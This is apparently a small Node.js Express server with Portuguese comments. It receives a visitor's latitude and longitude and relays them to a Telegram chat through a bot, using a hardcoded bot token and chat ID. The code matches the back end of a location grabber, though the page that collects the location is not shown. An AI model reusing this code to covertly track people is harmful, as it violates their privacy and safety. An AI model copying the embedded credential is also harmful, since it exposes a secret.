const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const path = require("path");

const app = express();
const PORT = 8088;

app.use(cors());
app.use(bodyParser.json());

// Servir arquivos estáticos (index.html, CSS, JS, etc.)
app.use(express.static(path.join(__dirname, "public")));

// Definir a página inicial como index.html
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Configuração do Telegram
const TELEGRAM_BOT_TOKEN = "7733976811:AAFGCUsEXO9mtP9aMm4b8DQja7WlzBcMZr8"; // Substitua pelo token do seu bot
const TELEGRAM_CHAT_ID = "-4628012349"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar

app.post("/send-location", async (req, res) => {
  const { latitude, longitude } = req.body;

  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true, message: "Localização enviada!" });
  } catch (error) {
    console.error("Erro ao enviar a localização:", error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Servidor rodando em http://localhost:${PORT}`);
});
